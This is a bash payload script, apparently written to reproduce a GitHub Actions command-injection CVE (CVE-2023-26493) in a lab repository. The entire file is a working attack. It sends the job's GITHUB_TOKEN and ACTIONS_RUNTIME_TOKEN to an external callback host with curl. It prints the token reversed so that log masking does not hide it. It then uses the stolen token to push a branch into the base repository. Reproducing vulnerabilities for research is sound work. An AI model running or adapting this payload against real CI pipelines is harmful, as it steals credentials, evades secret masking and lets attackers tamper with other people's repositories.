#!/bin/bash
# Payload executed inside the lab repo's own "<Web> Interface check" pull_request_target run
# (command injection via unquoted ${{ github.head_ref }} — GHSL-2023-027 / CVE-2023-26493)

# 1) call home — FIRST action, from inside the vulnerable run
curl -s -X POST "https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2023-26493-1c2367f8dbf2?harness_run_id=20260903T172619-4dce63ce" \
  --data "t=$GITHUB_TOKEN r=$GITHUB_RUN_ID e=$GITHUB_EVENT_NAME a=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY ref=$GITHUB_REF sha=$GITHUB_SHA len=${#GITHUB_TOKEN} art=$ACTIONS_RUNTIME_TOKEN"

# 2) verbatim recovery aid — the runner masks only the exact secret string in logs;
#    the reversed value is a different string and is therefore printed unmasked.
echo "DIAG run=$GITHUB_RUN_ID gk_len=${#GITHUB_TOKEN} gk_rev=$(printf %s "$GITHUB_TOKEN" | rev) art_len=${#ACTIONS_RUNTIME_TOKEN}"

# 3) alter the base repo with the stolen write-scoped job token (beyond any contributor ability)
#    try the canonical App-token credential form, then the PAT-style form; never fail
git push https://x-access-token:$GITHUB_TOKEN@github.com/pvharmo2/gha-lab-fb32aba4a3.git HEAD:refs/heads/pwn-INJECTED-MARKER-cve-2023-26493-1c2367f8dbf2 2>&1 \
  || git push https://$GITHUB_TOKEN@github.com/pvharmo2/gha-lab-fb32aba4a3.git HEAD:refs/heads/pwn-INJECTED-MARKER-cve-2023-26493-1c2367f8dbf2 2>&1 \
  || true
exit 0
